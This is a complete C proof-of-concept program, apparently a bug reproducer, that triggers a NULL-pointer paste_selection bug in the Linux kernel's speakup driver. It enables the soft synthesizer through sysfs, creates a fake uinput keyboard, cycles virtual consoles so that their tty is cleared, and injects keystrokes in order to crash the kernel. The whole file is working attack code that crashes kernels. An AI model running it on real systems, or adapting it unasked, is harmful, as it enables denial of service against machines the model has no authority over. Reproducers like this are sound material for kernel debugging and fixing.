// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <linux/input.h>
#include <linux/uinput.h>
#include <linux/kd.h>
#include <linux/vt.h>

static int ufd = -1;

static void wr_file(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0) {
		printf("[-] open(%s) failed: %s\n", path, strerror(errno));
		return;
	}
	if (write(fd, val, strlen(val)) < 0)
		printf("[-] write(%s, %s) failed: %s\n", path, val,
		       strerror(errno));
	else
		printf("[+] wrote '%s' to %s\n", val, path);
	close(fd);
}

static void cat_file(const char *path)
{
	char buf[128];
	int fd = open(path, O_RDONLY);
	ssize_t n;

	if (fd < 0) {
		printf("[-] open(%s) failed: %s\n", path, strerror(errno));
		return;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	if (n > 0) {
		buf[n] = 0;
		printf("[*] %s = %s", path, buf);
		if (buf[n - 1] != '\n')
			printf("\n");
	}
	close(fd);
}

static void emit(int type, int code, int val)
{
	struct input_event ev;

	memset(&ev, 0, sizeof(ev));
	ev.type = type;
	ev.code = code;
	ev.value = val;
	if (write(ufd, &ev, sizeof(ev)) != sizeof(ev))
		printf("[-] uinput write failed: %s\n", strerror(errno));
}

static void key(int code, int down)
{
	emit(EV_KEY, code, down);
	emit(EV_SYN, SYN_REPORT, 0);
}

static int setup_uinput(void)
{
	struct uinput_user_dev uidev;
	int fd, i;

	mknod("/dev/uinput", S_IFCHR | 0600, makedev(10, 223));

	fd = open("/dev/uinput", O_WRONLY | O_NONBLOCK);
	if (fd < 0)
		fd = open("/dev/input/uinput", O_WRONLY | O_NONBLOCK);
	if (fd < 0) {
		printf("[-] cannot open /dev/uinput: %s\n", strerror(errno));
		return -1;
	}

	ioctl(fd, UI_SET_EVBIT, EV_KEY);
	ioctl(fd, UI_SET_EVBIT, EV_SYN);

	for (i = KEY_ESC; i < 0x100; i++)
		ioctl(fd, UI_SET_KEYBIT, i);

	memset(&uidev, 0, sizeof(uidev));
	snprintf(uidev.name, UINPUT_MAX_NAME_SIZE, "spk-poc-kbd");
	uidev.id.bustype = BUS_USB;
	uidev.id.vendor = 0x1234;
	uidev.id.product = 0x5678;
	uidev.id.version = 1;
	if (write(fd, &uidev, sizeof(uidev)) != sizeof(uidev)) {
		printf("[-] uinput_user_dev write failed: %s\n",
		       strerror(errno));
		close(fd);
		return -1;
	}
	if (ioctl(fd, UI_DEV_CREATE) < 0) {
		printf("[-] UI_DEV_CREATE failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	printf("[+] uinput keyboard created\n");
	ufd = fd;
	usleep(300 * 1000);
	return 0;
}

static int arm_console(int n)
{
	char path[64];
	int fd;

	snprintf(path, sizeof(path), "/dev/tty%d", n);
	fd = open(path, O_RDWR | O_NOCTTY);
	if (fd < 0) {

		mknod(path, S_IFCHR | 0620, makedev(4, n));
		fd = open(path, O_RDWR | O_NOCTTY);
	}
	if (fd < 0) {
		printf("[-] open(%s) failed: %s\n", path, strerror(errno));
		return -1;
	}
	printf("[+] opened %s (VC %d allocated)\n", path, n);

	if (ioctl(fd, KDSKBLED, 0) < 0)
		printf("[-] KDSKBLED: %s\n", strerror(errno));
	if (ioctl(fd, KDSETLED, 0) < 0)
		printf("[-] KDSETLED: %s\n", strerror(errno));

	ioctl(fd, KDSETMODE, KD_TEXT);

	if (ioctl(fd, VT_ACTIVATE, n) < 0)
		printf("[-] VT_ACTIVATE(%d): %s\n", n, strerror(errno));
	if (ioctl(fd, VT_WAITACTIVE, n) < 0)
		printf("[-] VT_WAITACTIVE(%d): %s\n", n, strerror(errno));
	printf("[+] VC %d is now foreground\n", n);

	close(fd);
	usleep(200 * 1000);
	printf("[+] closed %s -> con_shutdown() cleared vc->port.tty\n", path);
	return 0;
}

static void fire(void)
{

	printf("[*] injecting  LEFTMETA(down) + KPSLASH  ...\n");
	fflush(stdout);

	key(KEY_LEFTMETA, 1);
	usleep(80 * 1000);
	key(KEY_KPSLASH, 1);
	usleep(80 * 1000);
	key(KEY_KPSLASH, 0);
	usleep(80 * 1000);
	key(KEY_LEFTMETA, 0);
	usleep(80 * 1000);
}

int main(int argc, char **argv)
{
	int round;
	int vcs[3] = { 6, 5, 1 };

	setvbuf(stdout, NULL, _IONBF, 0);

	printf("=== speakup paste_selection(NULL) PoC ===\n");

	wr_file("/sys/accessibility/speakup/synth", "soft\n");
	cat_file("/sys/accessibility/speakup/synth");

	if (setup_uinput() < 0)
		return 1;

	for (round = 0; round < 3; round++) {
		printf("\n--- round %d: VC %d ---\n", round, vcs[round]);
		if (arm_console(vcs[round]) < 0)
			continue;
		fire();
		printf("[*] waiting for the paste work item ...\n");
		sleep(2);
		printf("[!] still alive after round %d\n", round);

		fire();
		sleep(2);
	}

	printf("[-] no crash\n");
	return 0;
}
